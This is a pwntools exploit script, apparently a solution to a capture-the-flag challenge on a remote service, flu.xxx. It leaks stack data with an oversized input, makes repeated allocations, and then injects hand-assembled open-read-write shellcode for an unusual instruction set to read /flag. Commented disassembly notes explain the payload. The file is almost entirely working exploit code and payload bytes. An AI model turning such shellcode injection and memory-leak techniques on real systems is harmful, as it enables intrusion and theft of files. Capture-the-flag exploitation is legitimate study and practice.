from pwn import *

###Util
def create(data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'?\n', data)

###Exploit
r = remote('flu.xxx', 10150)

r.sendlineafter(b': ', b'/flag\x00'.ljust(0x1000,b'a'))
#r.sendlineafter(b': ', b'a'*0x1000)
r.recvuntil(b'Oh Dear, ')
res = r.recvuntil(b'. I see', drop = True)
#print(res[0x74:])
'''
for i in range(20):
    print(hex(u32(res[0x74+i*4:0x78+i*4])))
    #second value of 0x100055f0 is return address
    #third value of 0x3b002195 is stack ptr
'''

for i in range(14):
    create(b'M30W')

sc_orw = b'\xe6\xfc\x1f\x03' + \
         b'\x05\xd8\x19\x02' + \
         b'\xa0\x0c\x18\x02' + \
         b'\x04\x00\x10\x03' + \
         b'\x04\x00\x10\x02' + \
         b'\xc4\x01\x00\x03' + \
         b'\x01\x00\x44\xaf' + \
         b'' + \
         b'\x1c\x00\x18\x03' + \
         b'\x05\xd8\x19\x02' + \
         b'\xa0\x0c\x18\x02' + \
         b'\x04\x08\x10\x03' + \
         b'\xfc\x01\x00\x03' + \
         b'\x01\x00\x44\xaf' + \
         b'' + \
         b'\x0c\x00\x18\x03' + \
         b'\x05\xd8\x19\x02' + \
         b'\xa0\x0c\x18\x02' + \
         b'\x04\x08\x10\x03' + \
         b'\x04\x02\x00\x03' + \
         b'\x01\x00\x44\xaf'

'''
         b'\xff\xff\xff\xff' + \
   17844:    031ffce6               MOV       D1Ar1,#-100
   17ae4:    02100004               MOV       D0Ar4,#0

100055a0:    03188005               MOVT      D1Ar1,#0x1000 (*8 + 5)
100055a4:    031ac820               ADD       D1Ar1,D1Ar1,#0x5904 (*8)
10005614:    02180064               MOV       D0Ar2,#0xc    (*8 + 4)
10005684:    03100014               MOV       D1Ar3,#0x2    (*8 + 4)

10005590:    0318000c               MOV       D1Ar1,#0x1    (*8 + 4)

100054a0:    02188005               MOVT      D0Ar2,#0x1000
100054a4:    021ea120               ADD       D0Ar2,D0Ar2,#0xd424

100054d8:    030001fc               MOV       D1Re0,#0x3f   (*8 + 4)
100054dc:    af440001               SWITCH    #0x440001

#100056b4:    a0000020               B         100056b8 <_main+0x140>
'''
#sc_infLoop = b'\xe0\xff\xff\xa0'    #*8
sc_illegal = b'\xff\xff\xff\xff'    #*8
sc = sc_orw + sc_illegal

create(sc)
r.interactive()
